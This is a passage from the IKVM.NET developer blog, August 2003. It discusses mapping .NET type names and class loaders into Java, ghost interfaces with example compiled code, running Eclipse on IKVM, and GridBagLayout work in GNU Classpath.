        </p>
    </div>
    <p>
        I already explained how in response to Stuart's question, let me address the why here.
        In order to implement java.lang.String I have to write some code (System.String doesn't
        have equivalent methods of everything java.lang.String has). It's easiest to write
        this code in Java, because if I write it in C# I have to manually handle some special
        cases that the compiler handles for Java code. Hence I need to have access to the
        System.String methods. See <a href="http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/ikvm/ikvm/classpath/java/lang/StringHelper.java?rev=HEAD&amp;content-type=text/vnd.viewcvs-markup">StringHelper.java</a> for
        how it currently works. This isn't the right way, while writing that I thought of
        the remapping of instance methods (and constructors) to static methods, but I haven't
        implemented that. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>If one needs to know, in a generic way, wich Java class represents a .NET class,
            a new method should be enough for that. For example, Class.NETforName("NET.System.String")
            should return the same value that Class.forName("java.lang.String"). Another method
            could be Class.javaNameFromNETName, such as Class.javaNameFromNETName("NET.System.Exception")
            returns "java.lang.Throwable".</em> 
        </p>
    </div>
    <p>
        This wasn't the problem I was trying to solve and I don't think there is any need
        to know this. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>So, I agree about using a prefix, but I suggest not using "NET.", and use "org.cli."
            instead, or something like this. "NET." is just too generic.</em> 
        </p>
    </div>
    <p>
        Using someone else's&#160;domain name&#160;isn't that great either. How about simply&#160;"cli"? 
    </p>
    <p>
        Jonathan Pierce commented: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>I guess I don't fully understand the problem but I really dislike the idea of
            requiring prefixes when referencing or importing classes.</em> 
        </p>
    </div>
    <p>
        Do you mean prefixing in general or just the very long assembly name goo? 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>Why does the netexp implementation require that the class literal (which is compiled
            using Class.forName()) for statically linked netexp generated classes be in the classpath?</em> 
        </p>
    </div>
    <p>
        Currently, the class name doesn't contain enough information to resolve to a type,
        only when the netexp generated class is loaded&#160;IKVM notices the attribute in
        there that tells it what assembly the type lives in. I didn't want to search all loaded
        assemblies because that makes the behavior non-deterministic (sort of). If you run
        the class literal before the assembly gets loaded it would fail, but after it gets
        loaded it would work. 
    </p>
    <p>
        <strong>An Alternate Proposal</strong> 
    </p>
    <p>
        I've pretty much given up hope that there is a perfect solution to this problem, but
        I would like to suggest this simplified solution and see how everyone feels about
        this. 
    </p>
    <p>
        Basic idea: As soon as an assembly gets loaded into the AppDomain it becomes part
        of the boot classpath and they are "loaded" by the bootstrap class loader (to be clear,
        each assembly does <strong>not </strong>live in its own class loader). 
    </p>
    <p>
        Pros: 
    </p>
    <ul>
        <li>
            Simple model. 
        </li>
        <li>
            It mostly just works. 
        </li>
        <li>
            Consistent with the way precompiled Java code is treated. 
        </li>
        <li>
            It's basically the existing model. 
        </li>
    </ul>
    <p>
        Cons: 
    </p>
    <ul>
        <li>
            No way to deal with class name clashes. 
        </li>
        <li>
            Non-deterministic. In case of name clashes, the first one encountered is returned.
            Class.forName() only works if the assembly was already loaded somehow. However, to
            make it more usable, Class.forName() will also allow the class name to be an assembly
            qualified type name. In this case the class returned will have a different name from
            the one requested. 
        </li>
    </ul>
    <p>
        Why not have a class loader per assembly? 
    </p>
    <p>
        It turns out that having a class loader per assembly doesn't really solve anything.
        For the system to be usable, all assembly class loaders would have to be linked together
        lineairly. Here is a diagram: 
    </p>
    <p>
    </p>
    <code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; bootstrap
    class loader<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    |<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    mscorlib<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    |<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    System<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    |<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; (other
    assemblies)<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    |<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; extension
    class loader<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
    |<br />
    &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;application
    class loader </code> 
    <p>
    </p>
    <p>
        Each class loader must always ask its parent to load a particular class first, so
        when a type is defined in mscorlib there can never be another type with that same
        name, even if it&#160;would be&#160;loaded by a different class loader. As an aside,
        as some of you may know, some (most?) J2EE application servers get around this problem
        by violating the class loader rules (not calling the parent class loader first), in
        this case however that wouldn't work (and arguably in the J2EE case it doesn't work
        either). 
    </p>
    <p>
        Using a tree shaped class loader hierarchy does allow multiple classes with the same
        name, but it only works when each leaf of the hierarchy is basically a separate application. 
    </p>
    <p>
        Comments? 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/17/2003 13:41:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f27a5e84-f8d1-4874-bc8e-2591dbbc43e4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f27a5e84-f8d1-4874-bc8e-2591dbbc43e4">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 15 August 2003</h2></div>
<div class="newsItems"><a name="a3cdf1810-af7e-423f-bb5f-a6081507bb73"></a><div class="entry">
	<h3 class="entryTitle">More on interaction with .NET types</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        In yesterday's item I didn't do a good job of explaining the issue, so today I'll
        try again and respond to the comments as well. 
    </p>
    <p>
        First, let me start by explaining the current situation. There are two ways to get
        access to a .NET type: 
    </p>
    <ul>
        <li>
            <strong>netexp</strong> 
            <br />
            When you run <em>netexp</em> on a .NET assembly it generates Java classes for all
            public .NET types in the assembly. The Java classes contain no code, they're just
            stubs so that you can use a regular Java compiler to code against .NET types. When
            IKVM.NET loads such a stub, it notices that the class file contains a special attribute
            that says "this is a netexp stub class, please redirect to .NET type such-and-such".
            Note that the attribute contains an assembly qualified type name, because in general
            you can&#160;only load a type in .NET when you have its assembly qualified name. 
        </li>
        <li>
            <strong>Class.forName()</strong> 
            <br />
            Calling Class.forName() with an assembly qualified name will cause&#160;a .NET type
            to be loaded. The name of the class that is returned is the full name (i.e. not including
            the assembly part). 
        </li>
    </ul>
    <p>
        There are several problems with the current&#160;approach: 
    </p>
    <ul>
        <li>
            The name of a class loaded doesn't match with the name it was loaded with. 
        </li>
        <li>
            A&#160;type can be loaded&#160;under different names. 
        </li>
        <li>
            The class literal (which is compiled using Class.forName()) for <em>netexp </em>generated
            classes only works if the <em>netexp </em>generated class is in the classpath (even
            if the code was statically compiled). 
        </li>
    </ul>
    <p>
        Stuart commented: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><em>Have
        you considered only lowercasing the "system" namespace and no others? Or perhaps (to
        be really safe) only lowercasing top-level namespaces that match the name of a class
        in java.lang?<br />
        <br />
        Also, would it be possible for the implementation of Class.forName to do remapping
        of classnames from normal java ones to assembly qualified ones? If so, would that
        solve the problem? (I'm not entirely sure I understand what the problem is, so I'm
        not sure)</em> 
    </div>
    <p>
    </p>
    <p>
        Only lowercasing the system namespace isn't really a generic solution, because any
        .NET namespace that is the same as a Java class in the java.lang package would cause
        problems. Treating all names in the java.lang package specially feels like a kludge.
        Using a special prefix like Brian suggets would be a better idea. 
    </p>
    <p>
        In regards to the second point, in .NET you really need to have an assembly qualified
        name for a type. Searching all available assemblies isn't feasible. 
    </p>
    <p>
        I responded to Stuart: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>One of the problems is that all .NET types are loaded by the bootstrap class loader,
            so they have to have distinct names.</em> 
        </p>
        <p>
            <em>I just had an another idea. It might be a good idea to encode the assembly qualified
            name in the package. For example for the System.String type:</em> 
        </p>
        <p>
            <em>assembly.mscorlib.1.0.5000.0.neutral.b77a5c561934e089.System.String</em> 
        </p>
        <p>
            <em>This has the advantage that you can use "import" in most cases (although not for
            String) to use the short name.</em> 
        </p>
        <p>
            <em>I have to think about it, but I think I like it.<br />
            </em>
        </p>
    </div>
    <p>
        After thinking about it some more, I still really like this idea. It has three huge
        advantages: 1) There is a natural bi-directional mapping between the class name and
        the .NET type name, 2) Both <em>netexp</em> and Class.forName can use the same naming
        scheme and 3) The <em>netexp</em> generated classes aren't needed at runtime (or <em>ikvmc</em> compile
        time). 
    </p>
    <p>
        In response to my response Stuart commented: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><em>Hmmm...
        how fundamental a rearchitecting would it take to have a classloader per assembly?
        Then there would be a trivial isomorphism between Java's "names are unique within
        a classloader" and .NET's "names are unique within a strongly-named assembly", if
        I'm understanding correctly.</em> 
    </div>
    <p>
    </p>
    <p>
        Having a class loader per assembly is tempting, but it doesn't solve the issue of
        finding the .NET type (you still need to know in what assembly a type lives). This
        would be solvable by introducing a new API to get a class loader corresponding to
        an assembly, but that obviously has the downside that it doesn't interoperate very
        well with existing Java code. For example, the IKVM.NET AWT implementation lives in
        a .NET assembly (written in C#) and is loaded by GNU Classpath using Class.forName().
        This only works if Class.forName() has enough information about the assembly. 
    </p>
    <p>
        Brian Sullivan commented: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p>
            <em>I don't care for the occasional lowercasing ideas.</em> 
        </p>
        <p>
            <em>It could be that all .NET classes would begin with NET. from the Java perspective.</em> 
        </p>
        <p>
            <em>NET.System.String<br />
            NET.Some.Other.Class</em> 
        </p>
        <p>
            <em>import NET.*; // import all of .NET</em> 
        </p>
        <p>
            <em>This makes it clear where the class is defined and clearly separates all of .NET
            into its own package.</em> 
        </p>
    </div>
    <p>
        The prefixing is a good idea to get around the System name clash. BTW, import NET.*
        doesn't hierarchically import all packages, but only the classes in the NET package. 
    </p>
    <p>
        Does anyone have anything against the newly proposed name mangling scheme? Obviously
        the details need to be worked out (my proposed package name above doesn't actually
        compile), but what about the general idea? 
    </p>
    <p>
    </p>
    <p>
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/15/2003 15:09:27 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3cdf1810-af7e-423f-bb5f-a6081507bb73"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3cdf1810-af7e-423f-bb5f-a6081507bb73">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 14 August 2003</h2></div>
<div class="newsItems"><a name="a773aee9b-a5ad-412b-af85-41e68fb2e650"></a><div class="entry">
	<h3 class="entryTitle">Workarounds</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        This week I finished the support for <a href="http://weblog.ikvm.net/PermaLink.aspx/66">missing
        classes</a>. This allows Eclipse to run without the <a href="http://weblog.ikvm.net/PermaLink.aspx/76">-Xbootclasspath
        workaround</a>. 
    </p>
    <p>
        To run Eclipse (on Windows), you can now&#160;simply go to the Eclipse directory and
        type: 
    </p>
    <p>
    </p>
    <pre>   eclipse -vm \ikvm\bin\ikvm.exe</pre>
    <p>
        The verifier and compiler had to be changed to support, what I call in the code, unloadable
        classes (probably should have called it&#160;missing classes). Whenever the verifier
        encounters a reference of a type that cannot be loaded, it treats it as a special
        type (kind of like the null-type) and allows (almost) any operation to succeed. When
        the compiler encounters this type, it instead of generating CIL instruction to implement
        a particular instruction, it generates a call to a helper method in ByteCodeHelper
        that implements the instruction using reflection. At the moment the reflection results
        are not cached, so it could be made more efficient by adding caching, but since this
        shouldn't happen that often,&#160;this is not a high priority. 
    </p>
    <b>java.lang.CharSequence </b> 
    <p>
        I also finally implemented support for (what I've termed) <em>ghost interfaces</em>.
        Ghost interfaces are interfaces that are implemented by remapped types. So,&#160;for
        example, java.lang.String (really System.String) appears to implement java.lang.CharSequence,
        thus java.lang.CharSequence is a ghost interface. When a reference of a ghost interface
        type is passed around, it really is an object reference (so that it can contain references
        to types that actually implement the interface, as well as types that only appear
        to implement the type). 
    </p>
    <p>
        Here is an example: 
    </p>
    <p>
    </p>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">CharSequence
        toUpperCase(CharSequence seq) {<br />
        &#160; StringBuffer buf = <font color="#0000ff">new</font> StringBuffer(); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;<font color="#0000ff">int</font>&#160;len
        = seq.length();<br />
        <font color="#0000ff">&#160; for</font>(<font color="#0000ff">int</font> i = 0; i
        &lt; len; i++) { 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160; <font color="#0000ff">char</font> c
        = seq.charAt(i); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        c = Character.toUpperCase(c);<br />
        &#160;&#160;&#160; buf.append(c);<br />
        &#160; }<br />
        <font color="#0000ff">&#160; return</font> buf;<br />
        }<br />
    </div>
    <p>
        This is compiled as: 
    </p>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">Object&#160;toUpperCase(Object
        seq) {<br />
        &#160; StringBuffer buf = <font color="#0000ff">new</font> StringBuffer();<br />
        <font color="#0000ff"><font color="#000000">&#160;&#160;</font><font color="#0000ff">int</font><font color="#000000">&#160;len;</font></font> 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0"><font color="#0000ff"><font color="#000000">&#160;&#160;</font></font><font color="#0000ff">if<font color="#000000">(seq <font color="#0000ff">instanceof</font>&#160;String)
        {</font></font> 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        len = ((String)seq).length(); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0"><font color="#0000ff"><font color="#000000">&#160;
        }&#160;<font color="#0000ff">else</font> {</font></font> 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        len = ((CharSequence)seq).length(); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0"><font color="#0000ff"><font color="#000000">&#160;
        }</font> 
        <br />
        &#160; for</font>(<font color="#0000ff">int</font> i = 0; i &lt; len; i++) { 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160; <font color="#0000ff">char</font> c; 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160; <font color="#0000ff">if</font><font color="#000000">(seq <font color="#0000ff">instanceof</font>&#160;String)
        {</font> 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        &#160; c = ((String)seq).charAt(i); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        }&#160;<font color="#0000ff">else</font> { 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;&#160;&#160;
        c = ((CharSequence)seq).charAt(i); 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        } 
    </div>
    <div style="FONT-SIZE: 10pt; MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-FAMILY: 'Courier New'; BACKGROUND-COLOR: #f0f0f0">&#160;&#160;&#160;
        c = Character.toUpperCase(c);<br />
        &#160;&#160;&#160; buf.append(c);<br />
        &#160; }<br />
        <font color="#0000ff">&#160; return</font> buf;<br />
        }<br />
    </div>
    <p>
        There are some downsides to this approach: 
    </p>
    <ul>
        <li>
            Performance cost of the type check and the cast. BTW, since System.String is a sealed
            type, the type check can (theoretically) be very efficient. 
        </li>
        <li>
            Type is erased in the method signature, causing problems if an identifical signature
            already exists (the CLR supports a nice <a href="http://weblog.ikvm.net/PermaLink.aspx/82">mechanism</a>&#160;to
            workaround this, but unfortunately Reflection.Emit currently doesn't expose this functionality). 
        </li>
        <li>
            When this method is statically compiled and called from, for example, C#, the signature
            is confusing. 
        </li>
    </ul>
    <p>
        An alternative approach would be to wrap each String object when it needs to be treated
        as a CharSequence, but is harder to implement (object identity has to be preserved)
        and&#160;it isn't&#160;clear to me that it would be more efficient or elegant. 
    </p>
    <p>
        On the upside, this is a totally generic&#160;solution, there is no special support
        for String, any remapped type (i.e. type in map.xml) can declare to support any interface,
        and the compiler will automatically do the right thing. It is also used to make java.lang.Throwable
        (i.e. System.Exception) appear to implement java.io.Serializable. At the moment it
        isn't used for arrays (which should appear to implement java.io.Serializable and java.lang.Cloneable),
        but it would be easy to add this. 
    </p>
    <p>
        Oh, and since java.lang.String now implements CharSequence, I can now use the StringBuffer
        implementation from GNU Classpath instead of remapping it to System.Text.StringBuilder. 
    </p>
    <p>
        <strong>Reflecting on .NET types</strong> 
    </p>
    <p>
        Another thing I've been working on is&#160;integration with .NET types. When you want
        to use a .NET type from within Java you have two options: 1) use <em>netexp </em>to
        generate a jar containing stubs for the .NET classes, so you can statically compile
        against the .NET types, or 2) use reflection against the .NET type. 
    </p>
    <p>
        Something I dislike about <em>netexp</em> is that it includes remapping logic to map
        .NET types and signatures to Java compatible stuff. For example, when it encounters
        an enum, it generates a final Java class with public static final members or when
        it encounters a signature with a byref argument, it turns that into an array argument.
        Now this is all very nice, because it allows Java code to use most of the .NET features
        that Java doesn't really support, but the part I don't like is that this remapping
        is also done in the IKVM.NET runtime, because when it compiles Java code that was
        compiled against a <em>netexp</em> generated jar, it needs to do some of the same
        translations. This duplication of the remapping logic is obviously not a good thing.
        So I want to rewrite <em>netexp</em> in Java and make it use Java reflection to interrogate
        the .NET types, that way all the remapping is done in one place, the IKVM.NET runtime. 
    </p>
    <p>
        However, while thinking about this I realized that there is a problem with respect
        to type identity. There are two ways a .NET type can become visible in Java, <em>netexp </em>and
        Class.forName. Both have problems with the class name. <em>Netexp</em> converts to
        namespaces to lowercase, because Java compiler don't like the System namespace (System
        binds to the java.lang.System class and is not considered as a package name) and Class.forName
        requires the assembly qualified type name (e.g. "System.String, mscorlib, Version=1.0.5000.0,
        Culture=neutral, PublicKeyToken=b77a5c561934e089"). There are several ways to handle
        this: 
    </p>
    <ol>
        <li>
            Only allow .NET types to be visible through <em>netexp</em> generated classes. Obviously,
            I don't like this, because it would be very limiting and my plan to&#160;rewrite <em>netexp</em> in
            Java wouldn't work. 
        </li>
        <li>
            Allow .NET types to be visible through <em>netexp</em> with one name (e.g. system.String)
            and through Class.forName with another name (i.e. the assembly qualified name). The
            problem this causes is that once you create an instance of a class and call getClass
            on that instance, which of the two&#160;Class objects should it then return? 
        </li>
        <li>
            Use a universal name mangling scheme. Both <em>netexp</em> and Class.forName would
            represent System.String as, for example, "System_String__mscorlib__Version_1_0_5000_0__
            Culture_neutral__PublicKeyToken_b77a5c561934e089". I think this would work pretty
            well, but the obvious downside is that it makes the Java source code totally unreadable.
            Something that still would be an issue is how Java code reacts when it tries to load
            one class and then gets another (in the face of .NET binding policy). For example,
            it would be possible to load the above String, but then get a Class object that returns
            "..._Version_2_0_..." as its name, because the app is running on some future version
            of the CLR. 
        </li>
    </ol>
    <p>
        Maybe there are other solutions I haven't thought of, but at the moment I'm thinking
        of going with number 2. 
    </p>
    <p>
        I updated the snapshots on Tuesday. <a href="http://www.frijters.net/ikvmbin.zip">Binaries </a>and <a href="http://www.frijters.net/ikvm.zip">source</a>. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/14/2003 12:06:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=773aee9b-a5ad-412b-af85-41e68fb2e650"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=773aee9b-a5ad-412b-af85-41e68fb2e650">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 06 August 2003</h2></div>
<div class="newsItems"><a name="a26e2eef4-2a74-4d28-b690-a314039725a0"></a><div class="entry">
	<h3 class="entryTitle">PDC 2003</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I'm attending the PDC in October. I'd love to have a chat with any&#160;readers of
        my blog, so if you'll be there as well, send me an <a href="mailto:blog@jeroen.nu?subject=PDC 2003">e-mail</a>. 
    </p>
    <p>
        Thanks to <a href="http://radio.weblogs.com/0124699/2003/08/05.html">Jeff Sandquist</a>&#160;for
        the graphic.
    </p>
    <p>
        <a href="http://msdn.microsoft.com/events/pdc"><img src="http://weblog.ikvm.net/pdc2003flair.gif" border="0" /></a> 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/06/2003 18:01:59 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=26e2eef4-2a74-4d28-b690-a314039725a0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=26e2eef4-2a74-4d28-b690-a314039725a0">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 24 July 2003</h2></div>
<div class="newsItems"><a name="a8b14c003-e16a-4e99-a52e-ad776cbb8cbf"></a><div class="entry">
	<h3 class="entryTitle">GridBagLayout and more AWT</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        I did some work on the GNU Classpath GridBagLayout and it is now almost done (a large
        part was already done by Michael Koch). Obviously, writing&#160;the GridBagLayout
        code requires a good understanding of how it works. I never bothered to really understand
        the GridBagLayout, but I did use it quite frequently, a couple of years ago. I remember
        it was mostly a process of trial and error. After taking the time to figure out how
        it works, I must say that I actually really like it. It has a somewhat bad reputation
        in the Java community, but I think it's quite nice. 
    </p>
    <p>
        I can't leave it&#160;on that positive note, of course ;-) I have to criticize&#160;it
        as well. Sun has this really <em>nasty </em>habit of renaming virtual methods (adding
        aliases). This is not a good idea, to put it mildly. In JDK 1.4 they introduced: getLayoutInfo,
        adjustForGravity, getMinSize and arrangeGrid. These methods offer no new functionality,
        they are "replacements" for GetLayoutInfo, AdjustForGravity, GetMinSize and ArrangeGrid.
        So just because someone didn't abide by the method naming rules, some idiot now decides
        to enormously complicate the class. 
    </p>
    <p>
        You might think, what's the big deal? The problem is that when you're overriding a
        virtual method that has two names, you don't know which one you should override. Overriding
        both usually doesn't work either because you usually want to call the super class
        implementation one of which in turn usually calls the other version of the method,
        thus resulting in infinite recursion. 
    </p>
    <p>
        Anyway, I made new snapshots. <a href="http://www.frijters.net/ikvm.zip">Source</a> and <a href="http://www.frijters.net/ikvmbin.zip">binaries</a>. 
    </p>
    <p>
        What's new? 
    </p>
    <ul>
        <li>
            More&#160;AWT support, still nowhere near usable. But see <a href="http://www.frijters.net/client1.png">these</a> <a href="http://www.frijters.net/client2.png">screenshots</a>&#160;for
            some non-trivial stuff that is (partially) working. 
        </li>
        <li>
            Statically compiled classes are now annotated with a custom attribute for each interface
            they implement. This enables the Class.getInterfaces() to work correctly for statically
            compiled classes. 
        </li>
        <li>
            Fixed a bug in Method.getModifiers() for constructors in statically compiled classes,
            that caused them to appear final. 
        </li>
    </ul>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/24/2003 17:38:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8b14c003-e16a-4e99-a52e-ad776cbb8cbf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8b14c003-e16a-4e99-a52e-ad776cbb8cbf">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 July 2003</h2></div>
<div class="newsItems"><a name="a69e68e4c-5066-449b-8f03-e0608e6d8fbf"></a><div class="entry">
	<h3 class="entryTitle">Abstract Windowing Toolkit</h3>
	<div class="entryBody">
		<P>Originally I had titled this item "Afwul Windowing Toolkit", but then I decided to look up the dictionary definition&nbsp;of <EM>abstract</EM>. It's one of those words, like its close relative <EM>virtual</EM>,&nbsp;that we (programmers) like to use a lot using our own private (to our group) definition, but what else does it mean? </P>
<P>Here are some definitions courtesy of <A href="http://yourdictionary.com/">yourDictionary.com</A> </P>
<DIV style="MARGIN-LEFT: 20px">
<P><STRONG><FONT face=Arial color=#229966></FONT></STRONG></P>
<P><STRONG><FONT face=Arial color=#229966>ab&#183;stract<BR></FONT></STRONG><B><FONT face=arial,sans-serif size=-1><I>adj.</I></FONT></B> </P>
<OL>
<LI>Considered apart from concrete existence: <I><FONT color=#226699>an abstract concept.</FONT></I> 
<LI>Not applied or practical; theoretical. See Synonyms at <A href="http://www.yourdictionary.com/ahd/t/t0151500.html">theoretical</A>. 
<LI>Difficult to understand; abstruse: <I><FONT color=#226699>abstract philosophical problems.</FONT></I> 
<LI>Thought of or stated without reference to a specific instance: <I><FONT color=#226699>abstract words like <SPAN style="FONT-STYLE: normal">truth</SPAN> and <SPAN style="FONT-STYLE: normal">justice.</SPAN></FONT></I> 
<LI>Impersonal, as in attitude or views. 
